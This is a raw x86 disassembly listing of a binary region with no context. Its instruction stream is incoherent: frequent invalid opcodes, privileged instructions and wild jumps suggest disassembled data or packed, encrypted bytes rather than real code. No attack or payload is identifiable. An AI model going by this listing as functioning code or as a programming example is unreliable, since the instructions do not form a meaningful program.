  413926:	or     BYTE PTR [eax],al
  413928:	mov    WORD PTR [esi-0x9838cb7],es
  41392e:	ds (bad) 
  413930:	mov    ah,0x7a
  413932:	test   DWORD PTR [eax-0x74],eax
  413935:	sbb    dl,BYTE PTR [edi+0x7c824ef]
  41393b:	add    BYTE PTR [esi+esi*8-0x687396c2],cl
  413942:	or     al,0x6a
  413944:	mov    fs,WORD PTR [edi+0x9]
  413947:	push   0x0
	...
  413959:	add    BYTE PTR [eax],al
  41395b:	add    BYTE PTR [edi-0x73fff69b],cl
  413961:	lods   eax,DWORD PTR ds:[esi]
  413962:	adc    DWORD PTR [esp+ebx*8-0x2b],esi
  413966:	pop    ss
  413967:	add    ecx,DWORD PTR [ebp+ebp*2+0x2dd84484]
  41396e:	push   es
  41396f:	rol    BYTE PTR [ecx+0x31],0x12
  413973:	je     0x413935
  413975:	mov    dl,0x97
  413977:	out    dx,eax
  413978:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413979:	xchg   esp,eax
  41397a:	pop    es
  41397b:	add    DWORD PTR [esp+edx*4-0x6bca4867],ecx
  413982:	push   ds
  413983:	xchg   ecx,eax
  413984:	mov    bl,0x6c
  413986:	jno    0x41398a
  413988:	mov    WORD PTR [edx+edi*8-0x606fe0bd],ss
  41398f:	stos   DWORD PTR es:[edi],eax
  413990:	xchg   edx,eax
  413991:	or     BYTE PTR [ecx-0x1c9323fd],ah
  413997:	(bad)  
  413998:	jnp    0x41391d
  41399a:	pop    ecx
  41399b:	add    al,0xe6
  41399d:	xchg   esp,eax
  41399e:	pop    ecx
  41399f:	push   es
  4139a0:	not    BYTE PTR [ecx+ecx*2-0x206b0bf9]
  4139a7:	add    ecx,DWORD PTR [ebx+eax*4+0x34]
  4139ab:	adc    al,0x6b
  4139ad:	xor    ebp,ebx
  4139af:	add    ecx,DWORD PTR [ebp+ecx*1+0x8831024]
  4139b6:	dec    ebx
  4139b7:	lods   al,BYTE PTR ds:[esi]
  4139b8:	mov    ecx,DWORD PTR [eax]
  4139ba:	and    DWORD PTR [esp],eax
  4139bd:	dec    ebx
  4139be:	jmp    0x4139c3
	...
  4139d4:	mov    esp,fs
  4139d6:	pop    es
  4139d7:	hlt    
  4139d8:	lahf   
  4139d9:	aad    0xdf
  4139db:	sbb    ah,BYTE PTR [eax+0x78d89788]
  4139e1:	xor    DWORD PTR [esi-0x4d],0xa
  4139e5:	or     DWORD PTR [ebx+ebp*1+0x1f],esi
  4139e9:	cwde   
  4139ea:	fild   WORD PTR [ebx]
  4139ec:	push   esp
  4139ed:	(bad)  
  4139ee:	pop    ds
  4139ef:	nop
  4139f0:	lea    ebp,[edi-0x5e]
  4139f3:	sbb    ah,BYTE PTR [eax-0x80]
  4139f6:	(bad)  
  4139f7:	mov    bh,0x5f
  4139f9:	aad    0xdf
  4139fb:	sbb    ah,BYTE PTR [eax+0x7c]
  4139fe:	push   edi
  4139ff:	dec    eax
  413a00:	mov    BYTE PTR [edi+ebx*8+0x88fcf86],dl
  413a07:	shl    edi,0x6
  413a0a:	dec    eax
  413a0b:	jmp    0xe94d8777
  413a10:	(bad)  
  413a11:	(bad)
  413a15:	cli    
  413a16:	out    dx,eax
  413a17:	call   0x9750:0x14582c8
  413a1e:	or     cl,ch
  413a20:	adc    BYTE PTR [esp+edi*2-0x26],0x39
  413a25:	sbb    BYTE PTR [edi-0x17],0xa6
  413a29:	or     cl,dh
  413a2b:	out    dx,al
  413a2c:	or     esi,DWORD PTR [edx+0x60]
  413a2f:	mov    bh,0x40
  413a31:	aad    0x8
  413a33:	push   ebx
  413a34:	nop
  413a35:	sbb    eax,0xd6
	...
  413a4b:	add    BYTE PTR [ebx],dl
  413a4d:	jle    0x413a2f
  413a4f:	push   ecx
  413a50:	push   edi
  413a51:	xor    ebp,0xffffffc6
  413a54:	add    esi,DWORD PTR [edx-0x20]
  413a57:	cmp    DWORD PTR [edi-0x7d],eax
  413a5a:	cmc    
  413a5b:	mov    dh,0x13
  413a5d:	mov    ah,al
  413a5f:	inc    ecx
  413a60:	aaa    
  413a61:	xor    ebp,0xffffffb0
  413a64:	leave  
  413a65:	call   0x5652c7eb
  413a6a:	call   0x612b12a9
  413a6f:	sbb    al,0x75
  413a71:	ror    DWORD PTR [eax],0x81
  413a74:	cli    
  413a75:	xchg   esp,eax
  413a76:	leave  
  413a77:	jle    0x413a8a
  413a79:	shl    DWORD PTR [edi+0x22],0xcf
  413a7d:	xor    ebp,0x331586f5
  413a83:	(bad)  
  413a84:	rcl    ah,0x8
  413a87:	jmp    0x2962d3a6
  413a8c:	and    DWORD PTR [ebp-0x37],ecx
  413a8f:	sbb    edi,DWORD PTR es:[esi+0x8]
  413a93:	add    ch,ah
  413a95:	xchg   ebp,eax
  413a96:	or     bh,al
  413a98:	lock popf 
  413a9a:	cmc    
  413a9b:	push   DWORD PTR [ebp+0x7945cd95]
  413aa1:	cwde   
  413aa2:	or     BYTE PTR [eax],al
  413aa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413aa5:	aam    0x4c
  413aa7:	hlt    
  413aa8:	mov    ch,0x95
  413aaa:	or     BYTE PTR [eax],al
  413aac:	jb     0x413aef
  413aae:	in     eax,0x0
	...
  413ac4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ac5:	xchg   ebp,eax
  413ac6:	or     BYTE PTR [ebp-0x72ba5a20],cl
  413acc:	xor    BYTE PTR [ecx-0x46cf72bb],dl
  413ad2:	inc    ebp
  413ad3:	push   0x6a
  413ad5:	sbb    cl,BYTE PTR [esp+edi*8-0x4b]
  413ad9:	xor    al,BYTE PTR [edi]
  413adb:	push   0x76
  413add:	das    
  413ade:	cmc    
  413adf:	(bad)  
  413ae0:	pusha  
  413ae1:	ss inc edx
  413ae3:	inc    ecx
  413ae4:	gs push cs
  413ae6:	dec    esp
  413ae7:	call   0x12e65d2
  413aec:	or     DWORD PTR [ebp-0x50b28279],0x1225fff5
  413af6:	jns    0x413af7
  413af8:	nop
  413af9:	pushf  
  413afa:	xchg   BYTE PTR [ebp-0x13],al
  413afd:	pop    ss
  413afe:	je     0x413af8
  413b00:	xor    eax,0x688b4f11
  413b05:	mov    al,ds:0x280a3fe2
  413b0a:	ins    DWORD PTR es:[edi],dx
  413b0b:	call   0x37a8e4
  413b10:	ins    BYTE PTR es:[edi],dx
  413b11:	inc    edx
  413b12:	aad    0xff
  413b14:	lods   eax,DWORD PTR ss:[esi]
  413b16:	push   ds
  413b17:	sub    DWORD PTR [edx-0x64],ebp
  413b1a:	add    al,al
  413b1c:	shl    DWORD PTR [edi-0x80],0x45
  413b20:	mov    edi,cs
  413b22:	mov    ds:0xf1a1e40b,eax
  413b27:	inc    BYTE PTR [eax]
	...
  413b39:	add    BYTE PTR [eax],al
  413b3b:	add    bl,dl
  413b3d:	fld    DWORD PTR [esi+0x12b1bdf]
  413b43:	(bad)  
  413b44:	cmp    edi,ecx
  413b46:	cmp    BYTE PTR [edi],0x90
  413b49:	mov    dl,0xc6
  413b4b:	ret    0x2c3f
  413b4e:	or     DWORD PTR [edi+0x724cce8c],ecx
  413b54:	dec    ebp
  413b55:	imul   ecx,DWORD PTR [edx+eax*8-0x14316de0],0xf
  413b5d:	sbb    BYTE PTR ds:0x10d300ff,ch
  413b63:	je     0x413ae5
  413b65:	xchg   ebx,esp
  413b67:	pop    esp
  413b68:	(bad)  
  413b69:	sub    al,0x9
  413b6b:	(bad)  
  413b6c:	leave  
  413b6d:	jns    0x413b7b
  413b6f:	add    BYTE PTR [ebp+ebp*2+0x54747c8c],cl
  413b76:	or     al,0x0
  413b78:	mov    eax,gs
  413b7a:	pop    es
  413b7b:	jmp    0xfe5e9230
  413b80:	xadd   DWORD PTR [eax],edx
  413b83:	(bad)  
  413b84:	mov    edi,0x38741e74
  413b89:	das    
  413b8a:	neg    DWORD PTR [edi+eax*8-0x54]
  413b8e:	or     al,0xb8
  413b90:	lea    ebp,[ebp+0x9]
  413b93:	add    bh,al
  413b95:	xor    al,0x49
  413b97:	push   esp
  413b98:	pop    es
  413b99:	add    cl,BYTE PTR [edx-0x5a64c73d]
  413b9f:	dec    edi
	...
  413bb4:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  413bb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413bb7:	dec    DWORD PTR [ebp+ebp*2+0x11]
  413bbb:	jno    0x413b4a
  413bbd:	sub    bl,BYTE PTR ds:0x7494b182
  413bc3:	retf   
  413bc4:	dec    esp
  413bc5:	xchg   esp,eax
  413bc6:	fisttp WORD PTR [edi+0x651c1394]
  413bcc:	inc    esi
  413bcd:	aad    0xdf
  413bcf:	add    ebx,DWORD PTR [ecx-0x6a]
  413bd2:	sbb    al,BYTE PTR [edx+ebp*2-0x25]
  413bd6:	cmp    BYTE PTR [ebx+0x16],al
  413bd9:	mov    ds:0x944c9322,al
  413bde:	dec    eax
  413bdf:	jne    0x413b6d
  413be1:	xchg   esp,eax
  413be2:	fild   QWORD PTR [ebx]
  413be4:	(bad)  
  413be5:	lods   eax,DWORD PTR ds:[esi]
  413be6:	push   ss
  413be7:	pop    ss
  413be8:	push   cs
  413be9:	ret    0x9326
  413bec:	dec    esp
  413bed:	xchg   esp,eax
  413bee:	fisttp WORD PTR [edi-0x8d8086]
  413bf4:	mov    cl,cl
  413bf6:	cs xchg ebx,eax
  413bf8:	int3   
  413bf9:	xchg   esp,eax
  413bfa:	pop    es
  413bfb:	or     DWORD PTR [esi+0x4c0adf94],0x9
  413c02:	in     eax,0x2c
  413c04:	cmc    
  413c05:	xchg   ebp,eax
  413c06:	fild   WORD PTR [ebx]
  413c08:	dec    ebx
  413c09:	(bad)  
  413c0b:	add    ecx,DWORD PTR [esp+edx*4-0x7f377721]
  413c12:	rsm    
  413c14:	dec    ebx
  413c15:	in     eax,dx
  413c16:	loope  0x413c2e
	...
  413c2c:	mov    esi,0x3b044998
  413c31:	add    ebp,esp
  413c33:	push   ss
  413c34:	cwde   
  413c35:	xor    eax,0x8a2bc53a
  413c3a:	lahf   
  413c3b:	(bad)
  413c3f:	add    ecx,DWORD PTR [esp+edx*4+0x6c8f9286]
  413c46:	fimul  WORD PTR [bp+si]
  413c49:	jg     0x413cc3
  413c4b:	sar    bl,0x7e
  413c4e:	or     dl,bh
  413c50:	sti    
  413c51:	jbe    0x413be8
  413c53:	jmp    0x413be4
  413c55:	xchg   esp,eax
  413c56:	pop    eax
  413c57:	data16 cld 
  413c59:	xchg   BYTE PTR [eax+0x5e],bl
  413c5c:	(bad)  
  413c5d:	xchg   edx,eax
  413c5e:	pusha  
  413c5f:	jmp    0xc149d0f4
  413c64:	(bad)  
  413c65:	cwde   
  413c66:	or     cl,ch
  413c68:	ja     0x413c93
  413c6a:	or     ecx,ebp
  413c6c:	(bad)  
  413c6d:	mov    ecx,eax
  413c6f:	mov    ebp,0x2d4b55a6
  413c74:	(bad)  
  413c75:	xchg   esp,eax
  413c76:	or     cl,ch
  413c78:	adc    al,0xd8
  413c7a:	hlt    
  413c7b:	mov    ecx,0xeb5f7ef5
  413c80:	or     BYTE PTR [eax],0xf1
  413c83:	or     DWORD PTR [edi-0x5d128681],0xffffffa8
  413c8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c8b:	mov    dl,0x48
  413c8d:	jle    0x413c91
  413c8f:	sub    DWORD PTR [eax],eax
	...
  413ca1:	add    BYTE PTR [eax],al
  413ca3:	add    BYTE PTR [ebx],cl
  413ca5:	mov    ebp,?
  413ca7:	je     0x413c40
  413ca9:	jne    0x413c36
  413cab:	inc    BYTE PTR [eax+0x7919e17e]
  413cb1:	or     cl,dh
  413cb3:	shl    ebp,0xa6
  413cb6:	cmc    
  413cb7:	into   
  413cb8:	mov    ecx,0x9028357d
  413cbd:	push   ebp
  413cbe:	dec    ebx
  413cbf:	mov    ebp,0xe9089488
  413cc4:	adc    bl,cl
  413cc6:	hlt    
  413cc7:	sbb    esi,esp
  413cc9:	jge    0x413d2a
  413ccb:	jmp    0x413cc5
  413ccd:	jmp    0x413cd7
  413ccf:	sahf   
  413cd0:	std    
  413cd1:	xchg   ecx,eax
  413cd2:	cmc    
  413cd3:	cld    
  413cd4:	scas   al,BYTE PTR es:[edi]
  413cd5:	retf   0xe947
  413cd8:	test   BYTE PTR [ebp+eax*1+0x0],dl
  413cdc:	jns    0x413cc7
  413cde:	cmc    
  413cdf:	push   ebp
  413ce1:	ror    BYTE PTR [eax+ebx*8-0x3b],0x91
  413ce6:	or     BYTE PTR [eax],al
  413ce8:	sub    bh,BYTE PTR [esi]
  413cea:	rol    DWORD PTR [ecx],1
  413cec:	cmc    
  413ced:	xchg   ecx,eax
  413cee:	or     bh,bh
  413cf0:	(bad)  
  413cf1:	jge    0x413c79
  413cf3:	inc    ebp
  413cf4:	inc    ebp
  413cf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cf6:	jp     0x413d00
  413cf8:	xor    bh,BYTE PTR ds:0xa9f8c7e9
  413cfe:	cmc    
  413cff:	push   DWORD PTR [ebp+0x5145cd91]
  413d05:	cwde   
  413d06:	or     BYTE PTR [eax],al
	...
  413d1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d1d:	ror    BYTE PTR [eax+esi*8-0x4b],0x91
  413d22:	or     BYTE PTR [eax],al
  413d24:	push   0x3d
  413d26:	stc    
  413d27:	add    BYTE PTR [ebp-0x1772f76f],ah
  413d2d:	mov    ecx,0xa608ff45
  413d32:	in     eax,dx
  413d33:	in     eax,0x76
  413d35:	xchg   ecx,eax
  413d36:	or     BYTE PTR [ebx],cl
  413d38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d39:	and    al,0x1d
  413d3b:	and    eax,0xffffff8d
  413d3e:	cmc    
  413d3f:	jae    0x413d9d
  413d41:	test   al,0x7c
  413d43:	hlt    
  413d44:	bnd jle 0x413d21
  413d47:	dec    eax
  413d48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d49:	cwde   
  413d4a:	int    0x45
  413d4c:	sbb    DWORD PTR [edx-0x53cafff8],edx
  413d52:	push   cs
  413d53:	(bad)  
  413d54:	push   0x25fff5c4
  413d59:	xchg   ecx,eax
  413d5a:	cmc    
  413d5b:	jne    0x413d3e
  413d5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d5e:	sbb    al,0x95
  413d60:	pop    esi
  413d61:	push   ecx
  413d62:	cmc    
  413d63:	or     dh,ch
  413d65:	or     al,0x13
  413d67:	call   0xfe5386f8
  413d6c:	adc    ebp,edx
  413d6e:	fimul  WORD PTR [edi+edx*2+0x78000cac]
  413d75:	jne    0x413d93
  413d77:	adc    al,0x9
  413d79:	mov    dl,0xc9
  413d7b:	dec    edx
  413d7d:	ja     0x413db7
  413d7f:	inc    edi
	...
  413d94:	dec    ebp
  413d95:	imul   ecx,DWORD PTR [edx],0x0
  413d98:	mov    ebx,gs
  413d9a:	mov    BYTE PTR [eax+eax*8+0x6a],bh
  413d9e:	test   DWORD PTR [edx],ecx
  413da0:	shl    DWORD PTR [edi+0x5],cl
  413da3:	inc    BYTE PTR [ecx-0x29]
  413da6:	and    DWORD PTR [ebx-0xf69471],ecx
  413dac:	inc    ecx
  413dad:	(bad)  
  413dae:	and    DWORD PTR [ebx-0x73],esi
  413db1:	imul   ecx,DWORD PTR [ecx],0xfffffffc
  413db4:	pop    edi
  413db5:	stos   DWORD PTR es:[edi],eax
  413db6:	push   edx
  413db7:	(bad)  
  413db8:	mov    ds:0xeaf11c9d,eax
  413dbd:	(bad)  
  413dbe:	hlt    
  413dbf:	push   cs
  413dc0:	or     DWORD PTR [ecx+0x1c],ecx
  413dc3:	dec    BYTE PTR [ebx+0x670af107]
  413dc9:	imul   esi,DWORD PTR [esi+0x66],0x7a
  413dcd:	sbb    DWORD PTR [ecx],0xffffffb7
  413dd0:	lea    ebp,[ebp+0x9]
  413dd3:	add    bl,cl
  413dd5:	(bad)  
  413dd6:	xor    eax,edx
  413dd8:	mov    ecx,0x50822906
  413ddd:	bound  edi,QWORD PTR [edi+edx*2+0x410b78e4]
  413de4:	mov    WORD PTR [ebp-0x62],ss
  413de7:	add    BYTE PTR [edi+0x3b],cl
  413dea:	xchg   esi,eax
  413deb:	push   DWORD PTR [ebx]
  413ded:	out    dx,al
  413dee:	push   cs
  413def:	add    BYTE PTR [ebp+edx*2-0x6ad4df26],cl
  413df6:	scas   al,BYTE PTR es:[edi]
  413df7:	sbb    al,0x0
	...
  413e09:	add    BYTE PTR [eax],al
  413e0b:	add    BYTE PTR [eax],ah
  413e0d:	adc    BYTE PTR [esi-0x39b4cced],0x12
  413e14:	adc    ch,BYTE PTR [ebp-0x7b]
  413e17:	jmp    0x413e23
  413e19:	jl     0x413e15
  413e1b:	inc    ebx
  413e1c:	jg     0x413dc5
  413e1e:	xchg   edi,eax
  413e1f:	sub    eax,0xff7e7bb3
  413e24:	xor    eax,DWORD PTR [ecx]
  413e26:	jmp    0xe3c4:0xbc0a904a
  413e2d:	xchg   esp,eax
  413e2e:	fild   WORD PTR [ebx]
  413e30:	mov    esp,gs
  413e32:	loopne 0x413e38
  413e34:	mov    WORD PTR [edi+eax*2+0x4e7ba1c2],ss
  413e3b:	addr16 retf 0xa107
  413e3f:	add    edx,ebx
  413e41:	sar    DWORD PTR [ebx],1
  413e43:	add    eax,0x80df948d
  413e48:	push   eax
  413e49:	js     0x413dfa
  413e4b:	adc    bl,BYTE PTR [eax+0x53]
  413e4e:	xchg   edx,eax
  413e4f:	les    ebx,FWORD PTR [ebx-0x73fa688d]
  413e55:	xchg   esp,eax
  413e56:	jmp    0x4ad9:0xea20043
  413e5d:	pop    es
  413e5e:	mov    eax,ds:0xd5896403
  413e63:	adc    dh,BYTE PTR [edx+0x53]
  413e66:	in     al,dx
  413e67:	dec    edx
  413e68:	(bad)  
  413e6a:	fild   WORD PTR [ebx]
  413e6c:	mov    WORD PTR [edi+ebx*8+0x1b],ss
	...
  413e83:	add    BYTE PTR [ecx+0x6b12de98],bh
  413e89:	mov    ecx,0xec4a12f8
  413e8e:	adc    eax,0xd794cccb
  413e93:	cmp    DWORD PTR [eax+0x7b],eax
  413e96:	or     BYTE PTR [esi+0x625b5670],dh
  413e9c:	mov    ecx,ebx
  413e9e:	push   eax
  413e9f:	adc    edx,ecx
  413ea1:	xchg   ebp,eax
  413ea2:	inc    edi
  413ea3:	jmp    0xaa49442f
  413ea8:	jle    0x413e97
  413eaa:	or     BYTE PTR [ecx-0x16f76bb0],al
  413eb0:	push   edi
  413eb1:	jnp    0x413ea8
  413eb3:	jmp    0xee0b8c47
  413eb8:	(bad)  
  413eb9:	in     al,0x50
  413ebb:	add    DWORD PTR [esi-0x6816b86b],ebx
  413ec1:	add    eax,0xf37e2a08
  413ec6:	mov    ecx,0xed7ac8eb
  413ecb:	adc    DWORD PTR [eax-0x52aef76c],0x973ef579
  413ed5:	int3   
  413ed6:	sti    
  413ed7:	ss sahf 
  413ed9:	jae    0x413ec0
  413edb:	ss jle 0x413f58
  413ede:	loopne 0x413f20
  413ee0:	xchg   edi,eax
  413ee1:	jp     0x413ed8
  413ee3:	push   0xffffffbc
  413ee5:	or     BYTE PTR [ebx-0x58],al
	...
  413efc:	(bad)  
  413efd:	xchg   esp,eax
  413efe:	jl     0x413ef0
  413f00:	adc    bh,BYTE PTR [ecx+0x7a48b283]
  413f06:	cmc    
  413f07:	jne    0x413e8e
  413f09:	jns    0x413f26
  413f0b:	fs xor dl,ch
  413f0e:	or     BYTE PTR [esi],ah
  413f10:	xchg   esp,eax
  413f11:	gs inc eax
  413f13:	sub    BYTE PTR [eax+0xfe90893],cl
  413f19:	jb     0x413f38
  413f1b:	aad    0x7d
  413f1d:	jp     0x413eff
  413f1f:	repz call 0x5d40:0xf600f57a
  413f27:	push   0x479140
  413f2c:	std    
  413f2d:	and    cl,BYTE PTR [eax]
  413f2f:	ret    
  413f30:	cli    
  413f31:	cwde   
  413f32:	cmp    eax,0xaf963501
  413f37:	pop    es
  413f38:	and    eax,0xd7330896
  413f3d:	fwait
  413f3e:	clc    
  413f3f:	sbb    DWORD PTR [edi],0xffffff92
  413f42:	jnp    0x413f46
  413f44:	push   ds
  413f45:	xchg   ebx,eax
  413f46:	loope  0x413f31
  413f48:	sbb    eax,0x7afff616
  413f4d:	cwde   
  413f4e:	jp     0x413f4a
  413f50:	jp     0x413ef5
  413f52:	pop    edi
  413f53:	add    BYTE PTR ds:0xe5000859,bh
  413f59:	mov    ecx,0x172925f6
  413f5e:	dec    eax
	...
  413f73:	add    BYTE PTR [edx+0x71],bl
  413f76:	inc    ebp
  413f77:	xor    esp,0x2125f595
  413f7d:	pop    ss
  413f7e:	dec    eax
  413f7f:	add    BYTE PTR [edx+0x71],bh
  413f82:	pop    ebp
  413f83:	xor    esp,0xc925f595
  413f89:	push   ss
  413f8a:	dec    eax
  413f8b:	add    BYTE PTR [edx+0x71],bh
  413f8e:	push   ebp
  413f8f:	and    esp,0x1125f595
  413f95:	push   ss
  413f96:	dec    eax
  413f97:	add    BYTE PTR [edx+0x24816d71],cl
  413f9d:	xchg   ebp,eax
  413f9e:	cmc    
  413f9f:	and    eax,0x481609
  413fa4:	jp     0x414018
  413fa6:	xor    DWORD PTR gs:[eax+edx*4+0x15c125f5],0x628c0048
  413fb2:	out    dx,al
  413fb3:	ja     0x413fc2
  413fb5:	lods   al,BYTE PTR ds:[esi]
  413fb6:	or     al,0xff
  413fb8:	imul   ecx,edi,0x3a8c4089
  413fbe:	out    dx,al
  413fbf:	jg     0x413fce
  413fc1:	lods   al,BYTE PTR ds:[esi]
  413fc2:	or     al,0xff
  413fc4:	jno    0x413fb5
  413fc6:	mov    al,BYTE PTR [eax-0x74]
  413fc9:	xor    ch,dh
  413fcb:	xchg   DWORD PTR ds:0x69ff0cac,ecx
  413fd1:	out    dx,eax
  413fd2:	mov    al,BYTE PTR [eax-0x74]
  413fd5:	or     ch,dh
  413fd7:	pop    DWORD PTR [eax]
	...
  413fe9:	add    BYTE PTR [eax],al
  413feb:	add    BYTE PTR ds:0xb1ff0cac,cl
  413ff1:	fisttp WORD PTR [edx-0x10fd73c0]
  413ff7:	xchg   edi,eax
  413ff8:	or     eax,0xa9ff0cac
  413ffd:	jp     0xef1bcc43
  414003:	lahf   
  414004:	or     eax,0x71ff092c
  414009:	jp     0xef13cc4f
  41400f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414010:	or     eax,0x69ff092c
  414015:	jp     0xeeebcc5b
  41401b:	scas   eax,DWORD PTR es:[edi]
  41401c:	or     eax,0x71ff092c
  414021:	fisttp WORD PTR [edx-0x115d73c0]
  414027:	mov    bh,0xd
  414029:	sub    eax,0xd1a9ff09
  41402e:	mov    al,BYTE PTR [eax-0x74]
  414031:	jbe    0x41401e
  414033:	mov    edi,0xff092d0d
  414038:	mov    cl,0xb1
  41403a:	mov    al,BYTE PTR [eax-0x74]
  41403d:	xchg   esp,eax
  41403e:	out    dx,al
  41403f:	jmp    0x4615697
  414044:	push   ebx
  414045:	mov    dl,0xab
  414047:	test   esp,ecx
  414049:	xchg   esp,eax
  41404a:	(bad)  
  41404b:	jmp    0x46156a3
	...
  414064:	cmp    esi,DWORD PTR [edx-0x6b337a65]
  41406a:	mov    esi,0x201643e9
  41406f:	add    al,0x23
  414071:	mov    dl,0xcb
  414073:	test   esp,ecx
  414075:	xchg   esp,eax
  414076:	xchg   esi,eax
  414077:	jmp    0x46156af
  41407c:	or     esi,DWORD PTR [edx-0x6bb37a75]
  414082:	mov    gs,ecx
  414084:	repz adc eax,0xb1f30420
  41408a:	mov    eax,DWORD PTR [ebp-0x16996bb4]
  414090:	repz adc eax,0xb1db03a0
  414096:	pop    ebx
  414097:	test   DWORD PTR [esp+edx*4+0x5e],ecx
  41409b:	jmp    0x3e15663
  4140a0:	ret    
  4140a1:	mov    cl,0x4b
  4140a3:	test   DWORD PTR [esp+edx*4+0x36],ecx
  4140a7:	jmp    0x3e1565f
  4140ac:	stos   DWORD PTR es:[edi],eax
  4140ad:	mov    cl,0xeb
  4140af:	or     DWORD PTR [esp+edx*4+0x2e],0xa01293e9
  4140b7:	add    edx,DWORD PTR [ebx-0x337e144f]
  4140bd:	xchg   esp,eax
  4140be:	push   es
  4140bf:	jmp    0x3e15357
  4140c4:	jnp    0x414077
  4140c6:	fild   DWORD PTR [ecx+0x0]
	...
  4140dc:	int3   
  4140dd:	xchg   esp,eax
  4140de:	or     dh,dh
  4140e0:	je     0x414081
  4140e2:	mov    ch,BYTE PTR [eax+0x92b778f]
  4140e8:	push   cs
  4140e9:	aam    0x8
  4140eb:	fisub  WORD PTR [ebx+esi*4-0x76]
  4140ef:	sub    BYTE PTR [eax+0xe012b77],dl
  4140f5:	aam    0x8
  4140f7:	(bad)  
  4140f8:	and    al,0xab
  4140fa:	mov    ch,BYTE PTR [eax]
  4140fc:	mov    BYTE PTR [edi+0x2b],dh
  4140ff:	stc    
  414100:	or     eax,0x34ae08d4
  414105:	ret    
  414106:	mov    ch,BYTE PTR [eax]
  414108:	nop
  414109:	ja     0x414136
  41410b:	fisttp QWORD PTR ds:0xf49608d4
  414111:	ror    BYTE PTR [edx+0x2b778828],cl
  414117:	xor    DWORD PTR [esi],ecx
  414119:	aam    0x8
  41411b:	jle    0x414101
  41411d:	retf   0x288a
  414120:	nop
  414121:	ja     0x41414e
  414123:	sbb    DWORD PTR [esi],ecx
  414125:	aam    0x8
  414127:	data16 in al,0xe2
  41412a:	mov    ch,BYTE PTR [eax-0x4ed48871]
  414130:	or     eax,0xb44e08d4
  414135:	fimul  DWORD PTR [edx+0x2b778fa8]
  41413b:	leave  
  41413c:	or     eax,0x3608d4
	...
  414151:	add    BYTE PTR [eax],al
  414153:	add    BYTE PTR [edx+esi*8+0x778fa88a],dh
  41415a:	sub    edx,DWORD PTR [ecx+0x1e08d40d]
  414160:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414161:	jmp    0x952b:0x758fa88a
  414168:	or     eax,0x920008d5
  41416d:	ins    BYTE PTR es:[edi],dx
  41416e:	jno    0x4140f2
  414170:	and    al,0x92
  414172:	cmc    
  414173:	and    eax,0x4813f5
  414178:	jb     0x4141e8
  41417a:	lea    eax,[edx+0x25f590a4]
  414180:	loope  0x414194
  414182:	dec    eax
  414183:	add    BYTE PTR [edx+0x6e],ah
  414186:	test   DWORD PTR [edx+0x25f59074],eax
  41418c:	fst    DWORD PTR [edx]
  41418e:	dec    eax
  41418f:	add    dl,dh
  414191:	ins    DWORD PTR es:[edi],dx
  414192:	popf   
  414193:	xor    BYTE PTR [eax+edx*4-0xb],0x25
  414198:	rcl    DWORD PTR [edx],1
  41419a:	dec    eax
  41419b:	add    dl,dh
  41419d:	ins    DWORD PTR es:[edi],dx
  41419e:	test   eax,0xf5906482
  4141a3:	and    eax,0x48124d
  4141a8:	adc    ch,BYTE PTR [esi-0x5f]
  4141ab:	and    BYTE PTR [eax+edx*4+0x12b525f5],0x48
  4141b3:	add    BYTE PTR [edx+0x6d],ah
  4141b6:	mov    ecx,0x82
	...
  4141cb:	add    BYTE PTR [eax+edx*4+0x132d25f5],dh
  4141d2:	dec    eax
  4141d3:	add    BYTE PTR [edx],dh
  4141d5:	ins    DWORD PTR es:[edi],dx
  4141d6:	mov    cl,0x82
  4141d8:	hlt    
  4141d9:	xchg   ecx,eax
  4141da:	cmc    
  4141db:	and    eax,0x481275
  4141e0:	push   edx
  4141e1:	ins    DWORD PTR es:[edi],dx
  4141e2:	leave  
  4141e3:	and    ah,0x91
  4141e6:	cmc    
  4141e7:	and    eax,0x48126d
  4141ec:	jb     0x41425b
  4141ee:	lds    eax,FWORD PTR [edx+0x25f591e4]
  4141f4:	pop    ecx
  4141f5:	adc    cl,BYTE PTR [eax+0x0]
  4141f8:	mov    edx,?
  4141fa:	shl    BYTE PTR [ebx],0x88
  4141fd:	jmp    0x6341:0x83f90104
  414204:	mov    WORD PTR [ebx+0x9],gs
  414207:	ret    0x6b90
  41420a:	mov    bh,dh
  41420c:	mov    al,ch
  41420e:	icebp  
  41420f:	mov    bh,0x8e
  414211:	imul   ecx,DWORD PTR [ecx],0x0
  414214:	dec    esi
  414215:	outs   dx,DWORD PTR ds:[esi]
  414216:	or     DWORD PTR [ebx+0x7867344],eax
  41421c:	add    al,0x6f
  41421e:	or     DWORD PTR [eax],eax
  414220:	mov    WORD PTR [ecx],gs
  414222:	or     eax,0xf9530f00
  414227:	jl     0x4141bd
  414229:	add    ecx,DWORD PTR [eax+eax*1]
  41422c:	mov    WORD PTR [ebx+0x47],gs
  41422f:	add    eax,DWORD PTR [eax]
	...
  414241:	add    BYTE PTR [eax],al
  414243:	add    BYTE PTR [edx+ebp*8-0x7c6ee0ff],cl
  41424a:	inc    ecx
  41424b:	pop    es
  41424c:	mov    WORD PTR [ebx+0x9],gs
  41424f:	ret    0x6b88
  414252:	mov    bh,dh
  414254:	dec    esp
  414255:	nop
  414256:	hlt    
  414257:	mov    bh,0x86
  414259:	imul   ecx,DWORD PTR [ecx],0x0
  41425c:	into   
  41425d:	or     WORD PTR ds:0x96b0c,di
  414264:	pop    ecx
  414265:	add    DWORD PTR [ecx+0xb],0xffffff8c
  414269:	imul   ecx,DWORD PTR [ecx],0xffffffc2
  41426c:	nop
  41426d:	imul   eax,esi,0xffffffff
  414270:	mov    WORD PTR [ebx+0x9],gs
  414273:	jge    0x4141f9
  414275:	adc    esi,ebx
  414277:	push   DWORD PTR [ebx-0x73fcb896]
  41427d:	or     BYTE PTR [ecx],0x2
  414280:	mov    WORD PTR [ebx-0x7a],gs
  414283:	pop    es
